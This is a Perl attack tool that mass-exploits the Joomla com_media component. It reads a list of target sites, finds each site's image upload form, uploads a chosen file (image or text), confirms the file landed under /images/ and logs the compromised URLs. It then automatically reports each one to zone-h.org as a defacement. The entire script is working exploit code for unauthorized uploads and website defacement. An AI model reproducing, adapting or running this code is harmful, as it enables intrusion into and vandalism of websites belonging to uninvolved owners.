#!/usr/bin/perl

use Win32::Console::ANSI;
use Term::ANSIColor;
use LWP::UserAgent;
use HTTP::Request::Common;
if ($^O =~ /Win/) { system("cls"); } else { system("clear"); }
;
 
$file = $ARGV[1];
unless ($file) {
print"\n";
print"\n";
print colored ("                   		--=[Coded by ARON-TN]",'red'); 
print colored (" \n\n		--=[Usage : $0 list.txt file.jpg or file.txt",'green'),"\n\n";        
print colored (" 		--=[T00L FROM : $0 X4PriV8 V2 ",'green'),"\n\n";   
        exit;
}
open(tarrget,"<$ARGV[0]") or die "$!";
while(<tarrget>){


chomp($_);

$aron = <>;

$aron = $_;
if($aron !~ /http:\/\//)
{
$aron = "http://$aron";
}
$zeeby = $aron."/index.php?option=com_media&view=images&tmpl=component&fieldid=&e_name=jform_articletext&asset=com_content&author=&folder=";
 
print colored "\n\n [+] Scanning -> $aron",'green';
 
$ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1) Gecko/20090624 Firefox/3.5");
$fucki = $ua->get($zeeby);
$kzz = $fucki->content;
if($kzz =~/<form action="(.*?)" id=\"uploadForm\" class=\"form-horizontal\" name=\"uploadForm\" method=\"post\" enctype=\"multipart\/form-data\">/ || $kzz =~ /<form action="(.*?)" id=\"uploadForm\" name=\"uploadForm\" method=\"post\" enctype=\"multipart\/form-data\">/ )
{
        print colored "\n [+] Try Upload >> $aron",'green'; sleep(1);
 
$url = $1;
$url =~ s/&amp;/&/gi;
 
} else { print colored "\n [-] com_media not found -> $aron",'red'; sleep(1); }
 
my $res = $ua->post($url, Content_Type => 'form-data', Content => [ Filedata => [$file] ]);
 
$fuck = $aron."/images/".$file;
 
$check = $ua->get($fuck);
if($check->content =~/by/ || $check->is_success ) {
 
        print colored "\n [+] File Uploaded >> $fuck\n",'yellow';
 
open(save ,">>aron.txt");
print save "$fuck\n";
close save;
 
$res= $ua->post("http://zone-h.org/notify/single",[
                                'defacer'     => $age,
                                'domain1'   => $fuck,
                                'hackmode' => '28',
                                'reason'       => '1',
                                'submit'       => 'Send',
                                ]);
                                if ($res->content =~ /color="red">(.*)<\/font><\/li>/) {
                                print colored " [+] Submit zone-h $1\n",'red'; sleep(1);
                                }
                                else
                                {
                                print colored "\n [-] Submit zone-h ERROR\n",'blue'; sleep(1);
                                }
 
} else {  print colored "\n [-] File Upload Fail",'red';   }
 
 
}